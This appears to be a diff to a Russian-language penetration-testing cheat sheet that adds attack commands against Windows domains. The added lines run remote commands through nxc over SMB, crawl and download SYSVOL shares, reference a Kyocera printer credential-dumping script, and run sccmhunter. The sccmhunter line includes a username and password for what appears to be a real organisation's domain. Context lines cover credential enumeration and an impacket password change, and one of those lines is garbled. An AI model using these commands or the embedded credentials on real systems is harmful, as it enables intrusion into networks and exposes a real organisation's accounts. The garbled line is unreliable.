@@ -149,8 +149,12 @@
 		(показать инфо о пользователе)	nxc ldap 172.16.19.3 -u jimmy -p 'jimmy_001' --users jimmy		
 		
 		(используя модуль spider_plus просмотреть шары и скачать /tmp/nxc_hosted/nxc_spider_plus/<IP-адрес_цели>/)
-	nxc smb 10.10.10.10 -u 'user' -p 'password' -M spider_plus --spider SYSVOL --spider-folder Policies -o DOWNLOAD_FLAG=True 
-	
+		nxc smb 10.10.10.10 -u 'user' -p 'password' -M spider_plus --spider SYSVOL --spider-folder Policies -o DOWNLOAD_FLAG=True 
+
+		(нахождение shares) nxc smb TARGET -u USER -p PASS -x "dir C:\\" --codec cp866
+
+		(Чтение дисков на компах с русским языком) 		nxc smb TARGET -u USER -p PASS -x "dir C:\\" --codec cp866
+		 
 		 (нахождение локальных админов)  crackmapexec smb 192.168.50.110 -u 'Administrator' -p 'Password321' --local-auth 
 		  
 		(Пользователи залогиненные на компе)	sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users 
@@ -1627,3 +1631,13 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	pre2k auth -u raj -p Password@1 -dc-ip 192.168.1.48 -d ignite.local
 	nxc ldap 192.168.1.48 -u raj –p Password@1 -M pre2k
 	impacket-changepasswd ignite. расположение /DEMO$@ 192.168 . 1 . 48  -newpass  'Password@987'  -p rpc-samr
+
+
+# Get Kyocera creds
+		getkyoseracreds.sh
+	-- in archive
+	
+# SCCM (System Center Configuration Manager)
+
+	pipx install git+https://github.com/garrettfoster13/sccmhunter/
+	sccmhunter.py find -u adm.azukovskiy -p 'Apolon12!@' -d kuban.gazprom.ru -dc-ip 10.12.112.4 -debug
